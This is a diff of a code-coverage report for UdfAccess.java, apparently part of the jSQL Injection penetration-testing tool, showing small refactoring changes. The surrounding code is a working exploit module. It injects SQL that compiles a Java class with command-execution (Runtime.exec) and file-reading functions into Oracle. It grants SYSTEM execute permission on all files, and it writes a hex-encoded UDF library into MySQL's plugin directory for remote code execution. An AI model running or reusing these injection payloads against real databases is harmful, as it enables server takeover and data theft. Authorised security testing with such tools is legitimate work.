@@ -38,24 +38,24 @@ public class UdfAccess {
     private static final String NAME_TABLE = &quot;temp&quot;;
     private static final String RCE_JAVA_UTIL_SRC = &quot;RCE_JAVA_UTIL_SRC&quot;;
     private static final String RCE_JAVA_UTIL_FUNC = &quot;RCE_JAVA_UTIL_FUNC&quot;;
+    private static final String BEGIN = &quot;BEGIN&quot;;
 
     private final InjectionModel injectionModel;
-<span class="fc" id="L43">    private final BiPredicate&lt;String, String&gt; biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -&gt; {</span>
+<span class="fc" id="L44">    private final BiPredicate&lt;String, String&gt; biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -&gt; {</span>
         try {
-<span class="fc" id="L45">            return this.buildSysEval(nameLibraryRandom);</span>
-<span class="nc" id="L46">        } catch (JSqlException e) {</span>
-<span class="nc" id="L47">            throw new JSqlRuntimeException(e);</span>
+<span class="fc" id="L46">            return this.buildSysEval(nameLibraryRandom);</span>
+<span class="nc" id="L47">        } catch (JSqlException e) {</span>
+<span class="nc" id="L48">            throw new JSqlRuntimeException(e);</span>
         }
     };
 
-<span class="fc" id="L51">    public UdfAccess(InjectionModel injectionModel) {</span>
-<span class="fc" id="L52">        this.injectionModel = injectionModel;</span>
-<span class="fc" id="L53">    }</span>
+<span class="fc" id="L52">    public UdfAccess(InjectionModel injectionModel) {</span>
+<span class="fc" id="L53">        this.injectionModel = injectionModel;</span>
+<span class="fc" id="L54">    }</span>
 
     public void createExploitRce(ExploitMethod exploitMethod) throws JSqlException {
-<span class="nc bnc" id="L56" title="All 2 branches missed.">        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {</span>
-<span class="nc" id="L57">            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, &quot;Exploit method not implemented, use query body instead&quot;);</span>
-<span class="nc" id="L58">            return;</span>
+<span class="nc bnc" id="L57" title="All 2 branches missed.">        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {</span>
+<span class="nc" id="L58">            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, &quot;Exploit method not implemented, using query body instead&quot;);</span>
         }
 
 <span class="nc" id="L61">        var pattern = &quot; ; drop java source \&quot;%s\&quot;;&quot;;</span>
@@ -64,16 +64,16 @@ public class UdfAccess {
 <span class="nc" id="L64">        this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), &quot;body#drop-src&quot;);</span>
 <span class="nc" id="L65">        pattern = &quot; ; %s &quot;;</span>
 <span class="nc" id="L66">        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,</span>
-            &quot;BEGIN&quot;,
+            UdfAccess.BEGIN,
             &quot;\\n&quot;,
             &quot;EXECUTE IMMEDIATE 'create or replace and compile java source named \&quot;&quot;,
-            UdfAccess.RCE_JAVA_UTIL_SRC, &quot;_SRC&quot;,
-            &quot;\&quot; as import java.io.*; public class &quot;, UdfAccess.RCE_JAVA_UTIL_SRC, &quot;_SRC{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \&quot;\&quot;;while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;\\\\n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \&quot;\&quot;;while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;\\\\n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};';&quot;,
+            UdfAccess.RCE_JAVA_UTIL_SRC,
+            &quot;\&quot; as import java.io.*; public class &quot;, UdfAccess.RCE_JAVA_UTIL_SRC, &quot;{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = \&quot;\&quot;;while ((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;\\\\n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}} public static String readFile(String filename){ try{ BufferedReader myReader = new BufferedReader(new FileReader(filename));String stemp, str = \&quot;\&quot;;while((stemp = myReader.readLine()) != null) str %2B= stemp %2B \&quot;\\\\n\&quot;;myReader.close();return str;} catch (Exception e){ return e.toString();}}};';&quot;,
             &quot;\\n&quot;,
             &quot;END;&quot;
         )), &quot;body#create-src&quot;);
 <span class="nc" id="L75">        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,</span>
-            &quot;BEGIN&quot;,
+            UdfAccess.BEGIN,
             &quot;\\n&quot;,
             &quot;EXECUTE IMMEDIATE 'create or replace function &quot;,
             UdfAccess.RCE_JAVA_UTIL_FUNC,
@@ -84,7 +84,7 @@ public class UdfAccess {
             &quot;END;&quot;
         )), &quot;body#create-func&quot;);
 <span class="nc" id="L86">        this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,</span>
-            &quot;BEGIN&quot;,
+            UdfAccess.BEGIN,
             &quot;\\n&quot;,
             &quot;dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '&lt;&lt;ALL FILES&gt;&gt;', 'execute');&quot;,
             &quot;\\n&quot;,
@@ -115,7 +115,7 @@ public class UdfAccess {
 <span class="nc" id="L115">            return;</span>
         }
 
-<span class="fc" id="L118">        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificNormal().getNbIndexesFound() - 1;</span>
+<span class="fc" id="L118">        var nbIndexesFound = this.injectionModel.getMediatorStrategy().getSpecificUnion().getNbIndexesFound() - 1;</span>
 <span class="fc" id="L119">        var pathPlugin = this.getResult(&quot;select@@plugin_dir&quot;, &quot;udf#dir&quot;);</span>
 <span class="pc bpc" id="L120" title="1 of 2 branches missed.">        if (StringUtils.isEmpty(pathPlugin)) {</span>
 <span class="nc" id="L121">            throw new JSqlException(&quot;Incorrect plugin folder: path is empty&quot;);</span>
@@ -188,7 +188,7 @@ public class UdfAccess {
 <span class="fc" id="L188">        this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
             &quot;union&quot;,
 <span class="fc" id="L190">            &quot;'',&quot;.repeat(nbIndexesFound),</span>
-<span class="fc" id="L191">            String.join(&quot;&quot;, hexChunks),</span>
+<span class="fc" id="L191">            String.join(StringUtils.EMPTY, hexChunks),</span>
             pathRemoteFolder + nameExploitRandom
         ), &quot;body#union-dump&quot;);
 <span class="fc bfc" id="L194" title="All 2 branches covered.">        if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
@@ -200,7 +200,7 @@ public class UdfAccess {
 <span class="fc" id="L200">            this.injectionModel.injectWithoutIndex(String.format(pattern,</span>
                 &quot;;&quot;,
                 StringUtils.EMPTY,
-<span class="fc" id="L203">                String.join(&quot;&quot;, hexChunks),</span>
+<span class="fc" id="L203">                String.join(StringUtils.EMPTY, hexChunks),</span>
                 pathRemoteFolder + nameExploitRandom
             ), &quot;body#stack-dump&quot;);
 <span class="pc bpc" id="L206" title="1 of 2 branches missed.">            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {</span>
@@ -373,7 +373,7 @@ public class UdfAccess {
         }
     }
 
-    private String getResult(String query, String metadata) throws JSqlException {
+    public String getResult(String query, String metadata) throws JSqlException {
 <span class="fc" id="L377">        var sourcePage = new String[]{ StringUtils.EMPTY };</span>
 <span class="fc" id="L378">        return new SuspendableGetRows(this.injectionModel).run(</span>
             query,
